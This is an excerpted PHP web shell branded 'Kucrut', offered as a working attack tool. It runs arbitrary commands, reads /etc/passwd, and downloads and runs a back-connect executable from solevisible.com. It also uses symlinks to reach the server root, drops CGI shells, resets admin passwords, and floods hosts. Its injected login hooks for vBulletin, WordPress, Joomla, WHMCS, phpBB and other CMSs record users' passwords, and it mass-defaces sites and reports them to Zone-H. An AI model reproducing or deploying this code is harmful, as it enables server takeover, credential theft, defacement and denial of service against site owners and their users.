for($i=strlen($_POST['kucrut3'])-1;$i>=0;--$i)
$perms += (int)$_POST['kucrut3'][$i]*pow(8, (strlen($_POST['kucrut3'])-$i-1));
if(!@chmod($_POST['kucrut1'], $perms)){
if($chdir_fals&&$kucrut_canruncmd){
kucrutEx("cd '".addslashes($_POST["c"])."';chmod ".addslashes($_POST['kucrut3'])." '".addslashes($kucrut1_decoded)."'");
echo('Success!');
}else{
echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font><br><script>document.mf.kucrut3.value="";</script>';}
}else{echo('Success!');}
}
clearstatcache();
...
$kucrut3_escape = addslashes($_POST["kucrut3"]);
if(!empty($_POST['kucrut3'])){
$cmd_rename = false;
if($chdir_fals&&$kucrut_canruncmd){
if(_kucrut_is_writable($_POST['kucrut1'])){
$kucrut1_escape = addslashes($kucrut1_decoded);
kucrutEx("cd '".addslashes($_POST['c'])."';mv '".$kucrut1_escape."' '".addslashes($_POST['kucrut3'])."'");
}else{
$cmd_rename = true;
}
}else{
...
if(!@rename($_POST['kucrut1'], $_POST['kucrut3'])&&$cmd_rename){
echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['kucrut4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$kucrut3_escape.'\',\''.$ftype.'\',\''.$_POST['kucrut4'].'\')+"</div><div class=\'editor-file-name\'>'.$kucrut3_escape.'</div>";editor_files["'.$_POST['kucrut4'].'"].file = "'.$kucrut3_escape.'";updateFileEditor("'.$kucrut1_escape.'", "'.$kucrut3_escape.'");'.($ftype == "dir"?"updateDirsEditor('".$_POST['kucrut4']."','".$kucrut1_escape."');":"").'}catch(e){console.log(e)}</script>');$kucrut1_escape = $kucrut3_escape;}
}
echo '<form onsubmit="editor(\''.$kucrut1_escape.'\',\''.$_POST['kucrut2'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['kucrut4'].'\',\''.$ftype.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['kucrut3'])&&$_POST['kucrut3']!=''?$_POST['kucrut3']:$kucrut1_decoded)).'"><input type=submit value=" "></form>';
break;
case 'touch':
@chdir($_POST['c']);
if( !empty($_POST['kucrut3']) ) {
$time = strtotime($_POST['kucrut3']);
if($time){
$touched = false;
if($chdir_fals&&$kucrut_canruncmd){
...
clearstatcache();
echo '<script>kucrut3_="";</script><form onsubmit="editor(\''.addslashes($_POST['kucrut1']).'\',\''.$_POST['kucrut2'].'\',this.touch.value,\''.$_POST['c'].'\',\''.$_POST['kucrut4'].'\',\''.$ftype.'\');return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", ($chdir_fals?$file_info[4]:@filemtime($_POST['kucrut1']))).'"><input type=submit value=" "></form>';
break;
case 'image':
@chdir($_POST['c']);
echo('<hr>');
...
if(isset($_POST['kucrut2']) && ($_POST['kucrut2'] == 'info')) {
...
if(isset($_POST['kucrut2']) && ($_POST['kucrut2'] == 'exten')) {
echo '<div class=header>';
ob_start();
...
echo "<option value='".htmlspecialchars($v)."' ".($_POST['kucrut1']==$v?'selected':'').">".$k."</option>";
echo "</select> <input type='submit' value=' '/><br><textarea  name='input' style='margin-top:5px' class='bigarea'>".(empty($_POST['kucrut1'])?'':htmlspecialchars(@$_POST['kucrut2']))."</textarea></form>";
if(!empty($_POST['kucrut1'])){
$string = addslashes($_POST['kucrut2']);
...
if(!empty($_POST['kucrut1']) && !empty($_POST['kucrut2']) && !empty($_POST['kucrut3'])){
echo __pre();
$packets=0;
ignore_user_abort(true);
$exec_time=(int)$_POST['kucrut2'];
$time=time();
$max_time=$exec_time+$time;
$host=$_POST['kucrut1'];
$port=(int)$_POST['kucrut3'];
$method=$_POST['kucrut4'];
...
if(isset($_POST['kucrut3'])&&($_POST['kucrut3'] == 'whmcs')){
echo __pre();
...
if(isset($_POST['kucrut1']) && ($_POST['kucrut1'] == 'vb')){
echo __pre();
...
$mybb_dbn = $_POST['kucrut8'];
$mybb_dbp = $_POST['kucrut9'];
$mybb_index = $_POST['kucrut10'];
...
if(empty($_POST['ajax'])&&!empty($_POST['kucrut1']))
...
echo kucrutEx($cmd.$_POST['kucrut1'], true);
echo '</pre>';
}
echo "</div>";
kucrutfooter();
...
if(!empty($_POST['kucrut8']) && isset($_POST['kucrut8']) == 'domains'){
if(!_kucrut_file_exists("/etc/virtual/domainowners")){
echo __pre();
$solevisible9 = _kucrut_file('/etc/named.conf');
...
echo __pre();
$users = _kucrut_file("/etc/virtual/domainowners");
if(is_array($users)){
foreach($users as $boz){
$dom = explode(":",$boz);
echo $dom[0]."\n";}}}}
if(!empty($_POST['kucrut6']) && isset($_POST['kucrut6']) == 'valiases'){
echo '
...
if(isset($_POST['kucrut9']) && $_POST['kucrut9'] == '>>'){
if(!_kucrut_file_exists("/etc/virtual/domainowners")){
$site = trim($_POST['kucrut7']);
...
if(!empty($_POST['kucrut5']) && isset($_POST['kucrut5'])){
if(!_kucrut_file_exists("/etc/virtual/domainowners")){
echo __pre();
$i = 0;
while ($i < 60000) {
...
$user = explode(":",$boz);
echo trim($user[1]).'<br>';}}}
if(!empty($_POST['kucrut4']) && isset($_POST['kucrut4'])){
echo __pre();
if(_kucrut_can_runCommand(true,true)){echo __read_file("/etc/passwd");}elseif(function_exists("posix_getpwuid")){
...
if(!empty($_POST['kucrut2']) && isset($_POST['kucrut2'])){
...
if(isset($_POST['kucrut1'])&&!empty($_POST['kucrut1'])){
$lang = $_POST['kucrut1'];
$ip = $_POST['kucrut2'];
$port = $_POST['kucrut3'];
$arg = ($_POST['kucrut4']=='bind'?$port:$port.' '.$ip);
$tmpdir = KUCRUT_TEMPDIR;
...
if($lang=='bcwin'){
$kucrut = new KucrutCURL();
$s = $kucrut->Send('https://solevisible.com/bc/windows.exe');
$tmpdir = KUCRUT_TEMPDIR;
$f = @fopen($tmpdir.'/bcwin.exe','w+');
@fwrite($f, $s);
@fclose($f);
$out = kucrutEx($tmpdir."/bcwin.exe ".$_POST['kucrut2']." ".$_POST['kucrut3']);
}
if($lang=='php'){
echo "<pre class=ml1 style='margin-top:5px'>";
$code = __get_resource($lan);
...
<input type="text" name="defacer" size="67" id="text" placeholder="Kucrut 2012" />
<br>
...
if($_POST['kucrut5'] && $_POST['kucrut5'] == '>>'){
ob_start();
$hacker = $_POST['kucrut1'];
$method = $_POST['kucrut2'];
$neden = $_POST['kucrut3'];
$site = $_POST['kucrut4'];
if(empty($hacker)){
...
$kucrut->Send("http://www.zone-h.com/notify/single","post","defacer=".$hacker."&domain1=". $sites[$i]."&hackmode=".$method."&reason=".$neden);
++$i;
}
echo __pre()."<center><font color =\"#f20b0b\"><b>[+] Sending Sites To Zone-H Has Been Completed Successfully !!![+]</b><font></center>";
}
echo "</div>";
kucrutfooter();
}
function kucrutpwchanger(){
kucruthead();
...
Kucrut_Create_A_Tag('pwchanger',$vals);
echo '</h3></center>';
if(isset($_POST['kucrut1'])&&$_POST['kucrut1']=='wp'){
...
if ($_POST['kucrut2'] && $_POST['kucrut2'] == '>>'){
$localhost = $_POST['kucrut3'];
$database = $_POST['kucrut4'];
$username = $_POST['kucrut5'];
$password = $_POST['kucrut6'];
$admin = $_POST['kucrut8'];
$SQL = $_POST['kucrut9'];
$prefix = $_POST['kucrut10'];
...
if($_POST['kucrut2'] && $_POST['kucrut2'] == 'joomla'){
...
if ($_POST['kucrut1'] && $_POST['kucrut1'] == '>>'){
$localhost = $_POST['kucrut3'];
$database = $_POST['kucrut4'];
$username = $_POST['kucrut5'];
$password = $_POST['kucrut6'];
...
if($_POST['kucrut4'] && $_POST['kucrut4'] == 'vb'){
...
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if($_POST['kucrut1'] && $_POST['kucrut1'] == '>>'){
$localhost = $_POST['kucrut2'];
$database = $_POST['kucrut3'];
$username = $_POST['kucrut5'];
$password = $_POST['kucrut6'];
$prefix = $_POST['kucrut7'];
$admin = $_POST['kucrut8'];
...
if(isset($_POST['kucrut5']) && $_POST['kucrut5'] == 'phpbb'){
...
if(isset($_POST['kucrut6']) && $_POST['kucrut6'] == 'whmcs'){
...
if(isset($_POST['kucrut7']) && $_POST['kucrut7'] == 'mybb'){
...
if(isset($_POST['kucrut8']) && $_POST['kucrut8'] == 'nuke'){
...
if(isset($_POST['kucrut9']) && $_POST['kucrut9'] == 'drupal'){
...
if(isset($_POST['kucrut10']) && $_POST['kucrut10'] == 'smf'){
...
<input type="text" name="symfile" placeholder="Example : kucrut.txt" size="60"/>
<p><input type="submit" value=" " name="symlink" /></p></form></center>';
$path = $_POST['kucrut5'];
$symname = $_POST['kucrut6'];
$solevisible58 = $_POST['kucrut7'];
if($solevisible58){
$new_name = str_replace(".", "_", basename($symname));
$rand_dir = $new_name.rand(111,9999);
$sym_dir = 'kucrutsymlinkphp/'.$rand_dir.'/';
@mkdir($sym_dir, 0777, true);
kucrutcgihtaccess('sym', $sym_dir, $symname);
_kucrut_symlink("$path","$sym_dir/$symname");
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__HOST_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
}else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";}
}
if(isset($_POST['kucrut2']) && $_POST['kucrut2']=='symphp'){
$cant_symlink = true;
if(function_exists('symlink')||_kucrut_can_runCommand(false,false)){
@mkdir('kucrutsymlink',0777);
kucrutcgihtaccess('sym','kucrutsymlink/');
_kucrut_symlink('/','kucrutsymlink/root');
$table_header = "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table id='tbl_sympphp' align='center' width='40%' class='main' border='1'><td><span style='color:#FFFF01;'><b>*</span></b></td><td><span style='color:#f20b0b;'><b>Domains</span></b></td><td><span style='color:#FFFFFF;'><b>Users</span></b></td><td><span style='color:#FF0000;'><b>symlink</span></b></td>";
if(_kucrut_file_exists("/etc/named.conf") && !_kucrut_file_exists("/etc/virtual/domainowners") && _kucrut_file_exists("/etc/valiases/")){
echo "<center>";
$lines = array();
$anony_domains = array();
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://solevisible.com/images/farvahar-iran.png\"></p>";
echo '<p><div class="txtfont">Do you want to destroy me?!</div><a href=javascript:void(0) onclick="g(\'selfrm\',null,\'yes\');"> Yes</a>';
echo '</p></center></div>';
}
}
function kucrutcgishell(){
kucruthead();
$div = "";
kucrutCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __HOST_DATA_FOLDER__);
if(!in_array($_POST['kucrut1'],array('perl','py'))){
$div = "</div>";
...
if(isset($_POST['kucrut1'])&&in_array($_POST['kucrut1'],array('perl','py'))){
@mkdir('cgikucrut',0755);
@chdir('cgikucrut');
kucrutcgihtaccess('cgi');
$name = $_POST['kucrut1'].'.kucrut';
...
if($_POST['kucrut1']=='perl'){$code = $perl;}else{$code = $py;}
if(__write_file($name,$code)){
@chmod($name,0755);
echo '<iframe src="'.__HOST_DATA_FOLDER__.'/cgikucrut/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
kucrutfooter();
}
function kucrutWhmcs(){
kucruthead();
echo '<div class=header>';
...
if($_POST['kucrut5']!=''){
$db_host=($_POST['kucrut7']);
$db_username=($_POST['kucrut3']);
$db_password=($_POST['kucrut4']);
$db_name=($_POST['kucrut5']);
$cc_encryption_hash=($_POST['kucrut6']);
echo __pre();
...
$start = strip_tags($_POST['kucrut2']);
$end = strip_tags($_POST['kucrut3']);
$host = strip_tags($_POST['kucrut4']);
if(isset($_POST['kucrut4']) && is_numeric($_POST['kucrut3']) && is_numeric($_POST['kucrut2'])){
echo __pre();
...
function kucrutcgihtaccess($m,$d='', $symname=false){
$readme = "";
...
echo '<br><br>';
echo "<b><font color=\"#f20b0b\">[+] Founded ".sizeof($passwd)." entrys in /etc/passwd\n"."<br /></font></b>";
...
if(isset($_POST['kucrut4'])&&($_POST['kucrut4'] == '>>')){
$mail_to = $_POST['kucrut1'];
$mail_from = $_POST['kucrut2'];
$mail_subject = $_POST['kucrut3'];
$mail_content = $_POST['kucrut5'];
$count_mail = (int)$_POST['kucrut6'];
$mail_attach = $_POST['kucrut7'];
...
<div class="txtfont">Dir/File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['kucrut3'])?htmlspecialchars($_POST['kucrut3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
<div class="txtfont">Save Dir: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'kucrut.zip" size="60"/>
<input type="submit" value=" " name="ziper" />
</form></center></p>';
if(isset($_POST['kucrut5']) && ($_POST['kucrut5'] == '>>')){
$dirzip = $_POST['kucrut3'];
$zipfile = $_POST['kucrut4'];
if($GLOBALS['sys']!='unix'&&_kucrut_can_runCommand(true,true)){
kucrutEx("powershell Compress-Archive -Path '".addslashes($dirzip)."' -DestinationPath '".addslashes(basename($zipfile))."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
}elseif($GLOBALS['sys']=='unix'&&_kucrut_can_runCommand(true,true)){
kucrutEx("cd '".addslashes(dirname($zipfile))."';zip -r '".addslashes(basename($zipfile))."' '".addslashes($dirzip)."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
}elseif(class_exists('ZipArchive')){
if(__kucrutziper($dirzip, $zipfile)){
...
<div class="txtfont">File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['kucrut3'])?htmlspecialchars($_POST['kucrut3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
...
SaveTo: <input size="50" type="text" name="saveto" value="'.$GLOBALS['cwd'].'kucrut.txt"></font>
<input type="submit" name="btn" value=" "></form></center><br>';
$cms = $_POST['kucrut1'];
$saveto = $_POST['kucrut2'];
$cmspath = $_POST['kucrut4'];
if(!empty($cms) AND !empty($saveto) AND $_POST['kucrut4'] AND $_POST['kucrut3'] == '>>'){
echo __pre();
kucrutHijackCms($cms,$cmspath,$saveto);
}
echo '</div>';
kucrutfooter();
}
function kucrutHijackCms($cms,$cmspath,$saveto){
switch($cms){
case "vb":
...
$code='$kucrut_username = strtolower($vbulletin->GPC["vb_login_username"]);$kucrut_password = $vbulletin->GPC["vb_login_password"];$kucrut_file = "{saveto_path}";$sql_query = $vbulletin->db->query_read("SELECT * FROM " . TABLE_PREFIX . "user WHERE `username`=\'" . $kucrut_username . "\'");while($row = $vbulletin->db->fetch_array($sql_query)){if(strlen($kucrut_password) > 1 AND strlen($kucrut_username) > 1){$fp1 = @fopen($kucrut_file, "a+");@fwrite($fp1, $kucrut_username . \' : \' .  $kucrut_password." (" . $row["email"] . ")\n");@fclose($fp1); $f = @file($kucrut_file);$new = array_unique($f);$fp = @fopen($kucrut_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
...
$code = '$kucrut_file="{saveto_path}";$fp = fopen($kucrut_file, "a+");fwrite($fp, $_POST[\'log\']." : ".$_POST[\'pwd\']." (".($user->user_email).")\n");fclose($fp);$f = @file($kucrut_file);$new = array_unique($f);$fp = @fopen($kucrut_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
...
$code = '<?php jimport(\'joomla.user.authentication\');$Kucrut_auth = & JAuthentication::getInstance();$Kucrut_data = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Kucrut_options = array();$Kucrut_response = $Kucrut_auth->authenticate($Kucrut_data, $Kucrut_options);if($Kucrut_response->status == 1){$kucrut_file="{saveto_path}";$fp=@fopen($kucrut_file,"a+");@fwrite($fp, $Kucrut_response->username.":".$_POST[\'passwd\']." ( ".$Kucrut_response->email." )\n");@fclose($fp);$f = @file($kucrut_file);$new = array_unique($f);$fp = @fopen($kucrut_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
$code = '<?php if(isset($_POST[\'username\']) AND isset($_POST[\'password\']) AND !empty($_POST[\'username\']) AND !empty($_POST[\'password\'])){if($kucrut_connect=@mysqli_connect($db_host,$db_username,$db_password,$db_name)){$kucrut_file = "{saveto_path}";$kucrut_uname = @$_POST[\'username\'];$kucrut_pw = @$_POST[\'password\'];if(isset($_POST[\'language\'])){$kucrut_q = "SELECT * FROM tbladmins WHERE `username` = \'$kucrut_uname\' AND `password` = \'".md5($kucrut_pw)."\'";$admin = true;}else{$kucrut_q = "SELECT * FROM tblclients WHERE `email` = \'$kucrut_uname\'";$admin = false;}$kucrut_query = mysqli_query($kucrut_connect, $kucrut_q);if(mysqli_num_rows($kucrut_query) > 0 ){$row = mysqli_fetch_array($kucrut_query);$allow = true;if(!$admin){$__salt = explode(\':\', $row[\'password\']);$__encPW = md5($__salt[1].$_POST[\'password\']).\':\'.$__salt[1];if($row[\'password\'] == $__encPW){$allow = true;$row[\'username\'] = $row[\'email\'];}else{$allow = false;}}if($allow){$fp = @fopen($kucrut_file, "a+");@fwrite($fp, $row[\'username\'] . \' : \' .  $kucrut_pw." (" . $row["email"] . ") : ".($admin ? \'is_admin\' : \'is_user\')."\n");@fclose($fp);$f = @file($kucrut_file);$new = array_unique($f);$fp = @fopen($kucrut_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);}}}}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
$code = '$kucrut_q = $db->query("SELECT `email` FROM ".TABLE_PREFIX."users WHERE `username` = \'".$user[\'username\']."\'");$kucrut_fetch = $db->fetch_array($kucrut_q);$kucrut_file = "{saveto_path}";$fp = @fopen($kucrut_file, "a+");@fwrite($fp, $user[\'username\']." : ". $user[\'password\']." ( ".$kucrut_fetch[\'email\']." )\n");@fclose($fp);$f = @file($kucrut_file);$new = array_unique($f);$fp = @fopen($kucrut_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);';
...
$code = '$Kucrut_q = $this->DB->buildAndFetch(array(\'select\' => \'email\', \'from\' => \'members\', \'where\' => \'name="\'.$username.\'" OR email="\'.$email.\'"\'));$Kucrut_file = "{saveto_path}";$fp = @fopen($Kucrut_file, "a+");@fwrite($fp, $_POST[\'ips_username\'].\' : \'.$_POST[\'ips_password\'].\' ( \'.$Kucrut_q[\'email\'].\' )\'."\n");@fclose($fp);$f = @file($Kucrut_file);$new = array_unique($f);$fp = @fopen($Kucrut_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
...
$code = '$Kucrut_u = request_var(\'username\', \'\');$Kucrut_p = request_var(\'password\', \'\');if($Kucrut_u != \'\' AND $Kucrut_p != \'\'){$Kucrut_response = $auth->login($Kucrut_u,$Kucrut_p);if($Kucrut_response[\'status\'] == LOGIN_SUCCESS){$Kucrut_file ="{saveto_path}";$fp = @fopen($Kucrut_file, "a+");@fwrite($fp, $Kucrut_u." : ".$Kucrut_p. " ( ".$Kucrut_response[\'user_row\'][\'user_email\']." )\n");@fclose($fp);$f = @file($Kucrut_file);$new = array_unique($f);$fp = @fopen($Kucrut_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
$find = 'case \'login\':';
$code=str_replace('{saveto_path}',$saveto,$code);
$login=$path."/ucp.php";
$evil_login = "\t".$find."\n\t".$code;
...
function Kucrut_StrSearcher($dir,$string,$ext,$e,$arr=array()){
if(@is_dir($dir)){
$files=@scandir($dir);
...
Kucrut_StrSearcher($path,$string,$ext,$e,$results);
$results[] = $path;
}}}}
...
if(isset($_POST['kucrut1'])&&$_POST['kucrut1']=='file'){
...
<div class="txtfont">
Method: <select style="width: 18%;" onclick="kucrut_searcher_tool(this.value);" name="method"><option value="files">Find All Writable Files</option><option value="dirs">Find All Writable Dirs</option><option value="all">Find All Readable And Writable Files</option></select>
...
Kucrut_Searcher($dir,trim($ext),$method);
}
}
if($_POST['kucrut1']=='str'){
...
<input type="submit" name="btn" value=" "></div></form></center><br>';
$dir = $_POST['kucrut2'];
$string = $_POST['kucrut3'];
$ext = $_POST['kucrut5'];
if(!empty($string) AND !empty($dir) AND $_POST['kucrut4'] == '>>'){
echo __pre();
Kucrut_StrSearcher($dir,$string,$ext,$_POST['kucrut6']);
}
}
echo '</div>';
kucrutfooter();
}
function kucrutMassDefacer(){
kucruthead();
KucrutNum(5,6,7,8,9,10);
...
if(@is_dir($newfile)){
Kucrut_ReadDir($newfile,$method,$defpage);
}else{
if(!@is_writable($newfile))continue;
if(!@is_readable($newfile))continue;
Kucrut_Rewriter($newfile,$file,$defpage,$method);
}
}
closedir($dh);
...
function Kucrut_ReadDir($dir,$method='',$defpage=''){
...
if($file == '..' || $file == '.')continue;
$newfile=$dir.'/'.$file;
if(@is_readable($newfile)&&@is_dir($newfile))Kucrut_ReadDir($newfile,$method,$defpage);
if(@is_file($newfile)){
if(!@is_readable($newfile))continue;
Kucrut_Rewriter($newfile,$file,$defpage,$method);
}
...
function Kucrut_Rewriter($dir,$file,$defpage,$m='index'){
...
function Kucrut_Create_A_Tag($action,$vals){
$nulls = array();
...
function Kucrut_Searcher($dir, $ext, $method) {
if(@is_readable($dir)){
if($method == 'all')$ext = '*';
if($method == 'dirs')$ext = '*';
$globFiles = @glob("$dir/*.$ext");
...
foreach ($globDirs as $dir) {
if(!@is_readable($dir)||@is_link($dir)) continue;
@Kucrut_Searcher($dir, $ext, $method);
}
switch($method){
case "files":
foreach ($globFiles as $file){
...
function KucrutiFrameCreator($f,$width='100%',$height='600px'){
return('<iframe src="'.__HOST_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class KucrutCURL {
public $headers;
public $user_agent;
...
$this->path = KUCRUT_TEMPDIR.'/Kucrut_cookies.txt';
...
if (_kucrut_file_exists($cookie_file,false)) {
...
if(@is_dir($path)||_kucrut_is_dir($path)){
$file=$path.$file;
}elseif(@is_file($path)||_kucrut_is_dir($path,"-e")){
$file=$path;
}else{
return false;
}
...
if(empty($_POST['a']))
if(isset($default_action) && function_exists('kucrut' . $default_action))
$_POST['a'] = $default_action;
else
$_POST['a'] = 'FilesMan2';//'FilesMan';
if(!empty($_POST['a']) && function_exists('kucrut' . $_POST['a']))
call_user_func('kucrut' . $_POST['a']);
exit;
/*
